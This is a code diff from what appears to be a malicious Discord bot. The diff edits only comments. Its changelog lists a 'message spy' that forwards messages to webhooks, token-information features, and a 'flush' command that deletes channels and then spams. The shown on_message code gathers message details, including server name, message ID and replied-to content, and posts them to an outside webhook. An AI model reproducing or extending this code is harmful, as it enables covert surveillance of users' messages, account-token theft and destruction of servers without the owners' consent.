@@ -21,7 +21,7 @@ from discord.ext import commands
 
                 # ================ changelog ================ # 
                 # everything looks better now
-                # added message spy with full webhook support
+                # added message spy with webhooks
                 # added tokeninformation
                 # flush will now delete channels before spamming
                 # added tokeninfo.py
@@ -126,7 +126,7 @@ async def on_message(message):
         embed.add_field(name='🏫  Server', value=message.guild.name, inline=False)
         embed.add_field(name='🆔  Message ID', value=message.id, inline=False)
 
-        # Check if the message is replying to another message   
+       
         if message.reference and message.reference.message_id:
             replied_message = await message.channel.fetch_message(message.reference.message_id)
             if replied_message:
@@ -142,7 +142,7 @@ async def on_message(message):
             'embeds': [embed.to_dict()]
         }
 
-        # Send payload to the webhook
+       
         async with aiohttp.ClientSession() as session:
             async with session.post(fuckingwebhook, json=payload):
                 pass
